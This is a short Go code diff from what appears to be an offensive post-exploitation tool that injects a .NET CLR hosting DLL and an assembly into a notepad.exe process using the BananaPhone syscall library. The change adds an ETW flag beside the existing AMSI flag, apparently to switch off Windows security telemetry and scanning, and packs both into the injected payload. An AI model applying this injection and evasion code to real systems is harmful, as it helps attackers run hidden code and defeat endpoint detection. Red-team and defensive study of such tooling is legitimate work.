@@ -66,7 +66,7 @@ func getExitCodeThread(threadHandle syscall.Handle) (uint32, error) {
 
 // ExecuteAssembly loads a .NET CLR hosting DLL inside a notepad.exe process
 // along with a provided .NET assembly to execute.
-func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi bool) error {
+func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi bool, etw bool) error {
 
 	//Declare BananaPhone
 	bp, e := bananaphone.NewBananaPhone(bananaphone.DiskBananaPhoneMode)
@@ -216,11 +216,10 @@ func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi boo
 
 
 
-
-
 	// 4 bytes Assembly Size
 	// 4 bytes Params Size
 	// 1 byte AMSI bool  0x00 no  0x01 yes
+	// 1 byte ETW bool  0x00 no  0x01 yes
 	// parameter bytes
 	// assembly bytes
 	payload := append(AssemblySizeArr, ParamsSizeArr...)
@@ -229,11 +228,16 @@ func ExecuteAssembly(hostingDll []byte, assembly []byte, params string, amsi boo
 	} else {
 		payload = append(payload, byte(0))
 	}
-
-	payload = append(payload,  []byte(params)...)
-	payload = append(payload,  '\x00')
-
+	if etw {
+		payload = append(payload, byte(1))
+	} else {
+		payload = append(payload, byte(0))
+	}
+	payload = append(payload, []byte(params)...)
+	payload = append(payload, '\x00')
 	payload = append(payload, assembly...)
+
+
 
 	// WriteProcessMemory to write the .NET assembly + args
 	//_, err = writeProcessMemory(handle,  unsafe.Pointer(&payload[0]), uint32(len(payload)))
